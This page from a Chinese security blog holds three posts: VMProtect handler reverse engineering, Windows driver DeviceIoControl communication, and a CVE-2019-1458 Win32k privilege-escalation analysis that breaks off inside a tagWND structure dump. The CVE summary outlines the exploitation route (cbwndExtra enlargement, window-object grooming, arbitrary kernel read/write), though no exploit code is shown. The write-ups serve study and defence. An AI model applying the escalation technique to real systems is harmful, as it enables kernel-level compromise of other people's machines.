      <meta itemprop="description" content="reading, coding, travelling">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hazel'blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/26/%E8%84%B1%E5%A3%B3%E5%AD%A6%E4%B9%A0/VMProtect%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">Vmprotect逆向分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-08-26 00:00:00" itemprop="dateCreated datePublished" datetime="2022-08-26T00:00:00+08:00">2022-08-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-09-26 14:51:04" itemprop="dateModified" datetime="2022-09-26T14:51:04+08:00">2022-09-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%84%B1%E5%A3%B3%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">脱壳学习</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>867</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="源程序"><a href="#源程序" class="headerlink" title="源程序"></a>源程序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> v1 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">auto</span> v2 = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">auto</span> vsum = v1 + v2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1 + 2 = %d&quot;</span>, vsum);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>首先有几个寄存器需要关注：</p>
<table>
<thead>
<tr>
<th>寄存器</th>
<th>所存储数据</th>
</tr>
</thead>
<tbody><tr>
<td>R12</td>
<td>Handler表（未赋值）</td>
</tr>
<tr>
<td>R13</td>
<td>Handler基址</td>
</tr>
<tr>
<td>RBP</td>
<td>栈顶指针</td>
</tr>
<tr>
<td>RSI</td>
<td>字节码缓冲区（偏移）</td>
</tr>
<tr>
<td>RDI</td>
<td>伪寄存器组</td>
</tr>
<tr>
<td>RBX</td>
<td>解密Seed</td>
</tr>
</tbody></table>
<p>VMProtect首先需要将所需要的寄存器环境进行初始化，下面一次是：赋值handler表，字节码缓冲区操作，取操作码， 操作码解密</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220831160233365.png" alt="image-20220831160233365"></p>
<p>接下来跳转到下方代码，使用操作码索引handler偏移，然后加上基址，跳转到handler处</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220831162154098.png" alt="image-20220831162154098"></p>
<p>跟着跳转来到这里，红框中取操作数</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220831192745437.png" alt="image-20220831192745437"></p>
<p>可以看到是一个POP操作，将栈中数据POP到一个伪寄存器（<code>BYTE:[RSI-1]</code>指示了要POP到哪个寄存器）</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220831163555847.png" alt="image-20220831163555847"></p>
<p>紧跟着跳回这里，操作数索引伪寄存器组，赋值为rdx</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220831192943018.png" alt="image-20220831192943018"></p>
<p>到这里第一个handler就完成了，接下来的操作就是继续重复上面的取操作码，索引handler表，然后跳转到新的handler。</p>
<p>新的handler如下，取四字节操作数</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220831194547606.png" alt="image-20220831194547606"></p>
<p>下面应该是对操作数进行解码</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220831194635009.png" alt="image-20220831194635009"></p>
<p>然后push rax</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220831194748341.png" alt="image-20220831194748341"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220831195037885.png" alt="image-20220831195037885"></p>
<p>第一条jmp会跳到如下位置，ja操作其实是栈溢出错误检查（<strong>如果溢出了，那rbp会超过rdi+0xe0</strong>），结合上图中的红框代码，可以知道RDI指向的位寄存器组大小为<code>0xE0</code></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220831195243264.png" alt="image-20220831195243264"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220831195350669.png" alt="image-20220831195350669"></p>
<h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>上面的一些handler大概都是一些vmp虚拟的push、pop、jmp的操作，也就是和前面笔记所说的一样，就是把基于寄存器的CPU代码，改造成基于堆栈的CPU的伪代码。</p>
<p>vmp3与vmp1和vmp2的最大区别，解析<code>bytescode</code>不在由<code>VMDispatcher</code> 分发下一个指令执行什么了(每个指令记为一个handle) 而是有<code>vm_bytescode</code>掌管，执行上一个指令才能得到下一个指令地址这样一来代码的膨胀可想而知。在<code>VM_Instruct</code>内部应该是没有CALL指令的。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://erkeai.github.io/2022/08/15/wkp/%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/images%2FhdImg_f7fb2f283d6fd693d9c2444fb73eaf4715853190130.jpg">
      <meta itemprop="name" content="ZouFeIYu">
      <meta itemprop="description" content="reading, coding, travelling">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hazel'blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/15/wkp/%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/" class="post-title-link" itemprop="url">驱动开发-文件操作</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-08-15 00:00:00 / 修改时间：18:46:29" itemprop="dateCreated datePublished" datetime="2022-08-15T00:00:00+08:00">2022-08-15</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/" itemprop="url" rel="index"><span itemprop="name">驱动开发</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2.2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="Ring3和Ring0的通信DeviceIoControl"><a href="#Ring3和Ring0的通信DeviceIoControl" class="headerlink" title="Ring3和Ring0的通信DeviceIoControl"></a>Ring3和Ring0的通信DeviceIoControl</h3><p>这种通信方式是驱动程序与应用程序自定义IO控制码，然后调用<code>DeviceIoControl</code>函数，IO管理器会产生一个<code>MajorFunction</code> 为<code>IRP_MJ_DEVICE_CONTROL</code>（<code>DeviceIoControl</code>函数会产生此<code>IRP</code>），<code>MinorFunction</code> 为自己定义的控制码的<code>IRP</code>，系统就调用相应的处理<code>IRP_MJ_DEVICE_CONTROL</code>的派遣函数，你在派遣函数中判断<code>MinorFunction</code> ，是自定义的控制码你就进行相应的处理。</p>
<h4 id="操作码"><a href="#操作码" class="headerlink" title="操作码"></a>操作码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOCTL_Device_Function CTL_CODE(DeviceType, Function, Method, Access)</span></span><br></pre></td></tr></table></figure>

<p>　　* IOCTL_Device_Function：生成的IRP的MinorFunction<br>　　* DeviceType：设备对象的类型。一般以<code>FILE_DEVICE_XXX</code>的形式，但是这主要用于<strong>基于硬件</strong>的驱动程序，对于像本例子这样的软件驱动程序来说，这部分并不是很重要。微软规定第三方的值应该从<code>0x8000</code>开始。<br>　　* Function ：自定义的IO控制码。自己定义时取0x800到0xFFF，因为0x0到0x7FF是微软保留。<br>　　* Method ：数据的操作模式。</p>
<p>​       METHOD_BUFFERED：缓冲区模式</p>
<p>​       METHOD_IN_DIRECT：直接写模式</p>
<p>​       METHOD_OUT_DIRECT：直接读模式</p>
<p>​       METHOD_NEITHER ：Neither模式</p>
<ul>
<li>Access：访问权限，可取值有：</li>
</ul>
<p>​      FILE_ANY_ACCESS：表明用户拥有所有的权限</p>
<p>​      FILE_READ_DATA：表明权限为只读</p>
<p>​      FILE_WRITE_DATA：表明权限为可写</p>
<p>​      也可以 FILE_WRITE_DATA | FILE_READ_DATA：表明权限为可读可写，但还没达到FILE_ANY_ACCESS的权限。</p>
<h4 id="缓冲区方式的读写操作"><a href="#缓冲区方式的读写操作" class="headerlink" title="缓冲区方式的读写操作"></a>缓冲区方式的读写操作</h4><p>简单说一下这四种操作模式，首先第一种**缓冲区模式<code>METHOD_BUFFERED</code>**，表示系统将应用程序提供缓冲区的数据复制到内核模式下的地址中，这个地址用<code>pIrp-&gt;AssociatedIrp.SystemBuffer</code>来记录。因此这种方式的通信比较安全和方便，但是效率较低，适合数据量比较小的时候使用。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220812161136566.png" alt="image-20220812161136566"></p>
<p>第二种<strong>直接方式读写<code>METHOD_IN/OUT_DIRECT</code><strong>，与第一种方式不同，操作系统会将用户模式下的缓冲区锁住，然后操作系统将这段缓冲区在内核模式地址再次映射一遍。这样，</strong>用户模式和内核模式的缓冲区指向的是同一区域的物理内存</strong>。操作系统将用户模式地址锁定后，会用内存描述符表（MDL）记录这段内存。</p>
<p>这种方式效率高，但是单独占用物理页面，无法再进行其它操作（例如文件读写） ，适合数据量较大时使用。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220812162552303.png" alt="image-20220812162552303"></p>
<p>第三种是**其他读写方式<code>METHOD_NEITHER </code>**，派遣函数直接读写应用程序提供的缓冲区地址，在驱动程序中，直接操作应用程序的缓冲区地址是很危险的。只有驱动程序与应用程序运行在相同线程上下文的情况下，才能使用这种方式。</p>
<p>驱动的派遣函数中输入缓冲区可以通过I/O堆栈（IO_STACK_LOCATION）的<code>stack-&gt;Parameters.DeviceIoControl.Type3InputBuffer</code>得到。输出缓冲区可以通过<code>pIrp-&gt;UserBuffer</code>得到。在读写前使用<code>ProbeForRead</code>和<code>ProbeForWrite</code>函数探测地址是否可读和可写。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220812163159811.png" alt="image-20220812163159811"></p>
<p>通信流程：</p>
<p>　　* 驱动程序和应用程序自定义好IO控制码<br>　　* 驱动程序定义驱动设备名，符号链接名， 将符号链接名与设备对象名称关联 ，等待IO控制码（<code>IoCreateDevice</code>，<code>IoCreateSymbolicLink</code>）<br>　　* 应用程序由符号链接名通过<code>CreateFile</code>函数获取到设备句柄<code>DeviceHandle</code>，再用<code>DeviceIoControl</code>通过这个设备句柄发送控制码给派遣函数。</p>
<p><strong>总之，三环函数-&gt;NTDLL-&gt;封装IRP-&gt;由驱动进行接收处理-&gt;最后返回给R3</strong></p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p>1.首先需要和驱动程序一样定义操作码，以便通信</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220815102456775.png" alt="image-20220815102456775"></p>
<p>2.然后打开符号链接</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220815101857369.png" alt="image-20220815101857369"></p>
<p>3.通过<code>DeviceIoControl</code>将操作码等数据发给驱动，表明要执行什么操作，注意<code>Write</code>以及<code>Read</code>操作需要调用该函数两次，<code>Write</code>一次发送操作路径，一次发送操作数据，<code>Read</code>一次发送操作路径，返回文件大小；一次发送操作长度，返回文件内容。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220815102859789.png" alt="image-20220815102859789"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220815183826750.png" alt="image-20220815183826750"></p>
<h3 id="Ring0层"><a href="#Ring0层" class="headerlink" title="Ring0层"></a>Ring0层</h3><p>驱动程序首先需要创建设备名称和符号链接，并且需要创建设备对象，目的就是为了接受R3层的IRP数据，符号链接主要是为设备对象创建的，创建了符号链接才能再yR3层看到驱动。并且只有驱动内部含有符号链接名，应用层才能以文件形式打开这个驱动。</p>
<h4 id="驱动和设备的关系"><a href="#驱动和设备的关系" class="headerlink" title="驱动和设备的关系"></a>驱动和设备的关系</h4><p>驱动:  驱动则是用来操作设备的. </p>
<p>设备:  设备则是我们常说的外设. 比如键盘. 显示器.鼠标等等。</p>
<p>驱动和设备之间的关系是<strong>一对多</strong>的关系，驱动可以操作很多设备。</p>
<p>依据上面的数据关系来说，设备对象中肯定会存储驱动对象结构体的指针，驱动对象做外键存储到设备对象中.</p>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><p>1.创建设备名称和符号链接</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220813131057472.png" alt="image-20220813131057472"></p>
<p>2.注册回调函数</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220815101449066.png" alt="image-20220815101449066"></p>
<p>3.主要的操作函数，用来处理与Ring3的交互</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220815184356417.png" alt="image-20220815184356417"></p>
<p>因为采用的是缓冲区的方式读写，所以按照前面说的，输入输出其实都是一个缓冲区。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://erkeai.github.io/2022/08/01/sample/CVE-2019-1458%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/images%2FhdImg_f7fb2f283d6fd693d9c2444fb73eaf4715853190130.jpg">
      <meta itemprop="name" content="ZouFeIYu">
      <meta itemprop="description" content="reading, coding, travelling">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hazel'blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/01/sample/CVE-2019-1458%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">CVE-2019-1458漏洞分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-08-01 00:00:00" itemprop="dateCreated datePublished" datetime="2022-08-01T00:00:00+08:00">2022-08-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-08-08 14:39:23" itemprop="dateModified" datetime="2022-08-08T14:39:23+08:00">2022-08-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">样本分析</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>15k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>14 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p><code>CVE-2019-1458</code>是<strong>Win32k</strong>中的特权提升漏洞，<strong>Win32k</strong>组件无法正确处理内存中的对象时，导致<strong>Windows</strong>中存在一个特权提升漏洞。该漏洞存在于win32k的<code>xxxPaintSwitchWindow</code>函数中，函数会将窗口对象扩展区域最开始八字节保存的内容取出，将其作为内存地址进行读写。但是该地址可以通过<code>SetWindowLong</code>函数进行更改，而函数没有验证保存的内容是否指向合法的地址就进行读写，如果地址不合法，则会产生BSOD错误。</p>
<p>通过设置，可以利用函数对指向地址进行读写的操作来扩大窗口的<code>cbwndExtra</code>，通过内存布局，在被扩大<code>cbwndExtra</code>的窗口高地址不远处布置一个窗口对象，通过修改窗口对象的成员实现任意地址读写，最终实现提权。</p>
<p>成功利用此漏洞的攻击者可以在内核模式下运行任意代码。然后攻击者可能会安装程序、查看、更改或删除数据；或创建具有完全用户权限的新帐户。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞存在于函数为<code>xxxPaintSwitchWindow</code>，我们知道64位程序的调用约定是rcx,rdx,r8,r9。该函数只有一个参数，也就是窗口对象的<code>tagWnd</code>结构体，该结构体在Win7是公开的。下面圈出来的地方分别是，先将<code>tagWND</code>赋给rsi，然后取出扩展区域最开始的八个字节保存的内容。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _tagWND                                     // 170 elements, 0x128 bytes (sizeof) </span><br><span class="line">          &#123;                                                                                                </span><br><span class="line">/*0x000*/     struct _THRDESKHEAD head;                              // 5 elements, 0x28 bytes (sizeof)    </span><br><span class="line">              union                                                  // 2 elements, 0x4 bytes (sizeof)     </span><br><span class="line">              &#123;                                                                                            </span><br><span class="line">/*0x028*/         ULONG32      state;                                                                      </span><br><span class="line">                  struct                                             // 32 elements, 0x4 bytes (sizeof)    </span><br><span class="line">                  &#123;                                                                                        </span><br><span class="line">/*0x028*/             INT32        bHasMeun : 1;                     // 0 BitPosition                      </span><br><span class="line">/*0x028*/             INT32        bHasVerticalScrollbar : 1;        // 1 BitPosition                      </span><br><span class="line">/*0x028*/             INT32        bHasHorizontalScrollbar : 1;      // 2 BitPosition                      </span><br><span class="line">/*0x028*/             INT32        bHasCaption : 1;                  // 3 BitPosition                      </span><br><span class="line">/*0x028*/             INT32        bSendSizeMoveMsgs : 1;            // 4 BitPosition                      </span><br><span class="line">/*0x028*/             INT32        bMsgBox : 1;                      // 5 BitPosition                      </span><br><span class="line">/*0x028*/             INT32        bActiveFrame : 1;                 // 6 BitPosition                      </span><br><span class="line">/*0x028*/             INT32        bHasSPB : 1;                      // 7 BitPosition                      </span><br><span class="line">/*0x028*/             INT32        bNoNCPaint : 1;                   // 8 BitPosition                      </span><br><span class="line">/*0x028*/             INT32        bSendEraseBackground : 1;         // 9 BitPosition                      </span><br><span class="line">/*0x028*/             INT32        bEraseBackground : 1;             // 10 BitPosition                     </span><br><span class="line">/*0x028*/             INT32        bSendNCPaint : 1;                 // 11 BitPosition                     </span><br><span class="line">/*0x028*/             INT32        bInternalPaint : 1;               // 12 BitPosition                     </span><br><span class="line">/*0x028*/             INT32        bUpdateDirty : 1;                 // 13 BitPosition                     </span><br><span class="line">/*0x028*/             INT32        bHiddenPopup : 1;                 // 14 BitPosition                     </span><br><span class="line">/*0x028*/             INT32        bForceMenuDraw : 1;               // 15 BitPosition                     </span><br><span class="line">/*0x028*/             INT32        bDialogWindow : 1;                // 16 BitPosition                     </span><br><span class="line">/*0x028*/             INT32        bHasCreatestructName : 1;         // 17 BitPosition                     </span><br><span class="line">/*0x028*/             INT32        bServerSideWindowProc : 1;        // 18 BitPosition                     </span><br><span class="line">/*0x028*/             INT32        bAnsiWindowProc : 1;              // 19 BitPosition                     </span><br><span class="line">/*0x028*/             INT32        bBeingActivated : 1;              // 20 BitPosition                     </span><br><span class="line">/*0x028*/             INT32        bHasPalette : 1;                  // 21 BitPosition                     </span><br><span class="line">/*0x028*/             INT32        bPaintNotProcessed : 1;           // 22 BitPosition                     </span><br><span class="line">/*0x028*/             INT32        bSyncPaintPending : 1;            // 23 BitPosition                     </span><br><span class="line">/*0x028*/             INT32        bRecievedQuerySuspendMsg : 1;     // 24 BitPosition                     </span><br><span class="line">/*0x028*/             INT32        bRecievedSuspendMsg : 1;          // 25 BitPosition                     </span><br><span class="line">/*0x028*/             INT32        bToggleTopmost : 1;               // 26 BitPosition                     </span><br><span class="line">/*0x028*/             INT32        bRedrawIfHung : 1;                // 27 BitPosition                     </span><br><span class="line">/*0x028*/             INT32        bRedrawFrameIfHung : 1;           // 28 BitPosition                     </span><br><span class="line">/*0x028*/             INT32        bAnsiCreator : 1;                 // 29 BitPosition                     </span><br><span class="line">/*0x028*/             INT32        bMaximizesToMonitor : 1;          // 30 BitPosition                     </span><br><span class="line">/*0x028*/             INT32        bDestroyed : 1;                   // 31 BitPosition                     </span><br><span class="line">                  &#125;;                                                                                       </span><br><span class="line">              &#125;;                                                                                           </span><br><span class="line">              union                                                  // 2 elements, 0x4 bytes (sizeof)     </span><br><span class="line">              &#123;                                                                                            </span><br><span class="line">/*0x02C*/         ULONG32      state2;                                                                     </span><br><span class="line">                  struct                                             // 30 elements, 0x4 bytes (sizeof)    </span><br><span class="line">                  &#123;                                                                                        </span><br><span class="line">/*0x02C*/             INT32        bWMPaintSent : 1;                 // 0 BitPosition                      </span><br><span class="line">/*0x02C*/             INT32        bEndPaintInvalidate : 1;          // 1 BitPosition                      </span><br><span class="line">/*0x02C*/             INT32        bStartPaint : 1;                  // 2 BitPosition                      </span><br><span class="line">/*0x02C*/             INT32        bOldUI : 1;                       // 3 BitPosition                      </span><br><span class="line">/*0x02C*/             INT32        bHasClientEdge : 1;               // 4 BitPosition                      </span><br><span class="line">/*0x02C*/             INT32        bBottomMost : 1;                  // 5 BitPosition                      </span><br><span class="line">/*0x02C*/             INT32        bFullScreen : 1;                  // 6 BitPosition                      </span><br><span class="line">/*0x02C*/             INT32        bInDestroy : 1;                   // 7 BitPosition                      </span><br><span class="line">/*0x02C*/             INT32        bWin31Compat : 1;                 // 8 BitPosition                      </span><br><span class="line">/*0x02C*/             INT32        bWin40Compat : 1;                 // 9 BitPosition                      </span><br><span class="line">/*0x02C*/             INT32        bWin50Compat : 1;                 // 10 BitPosition                     </span><br><span 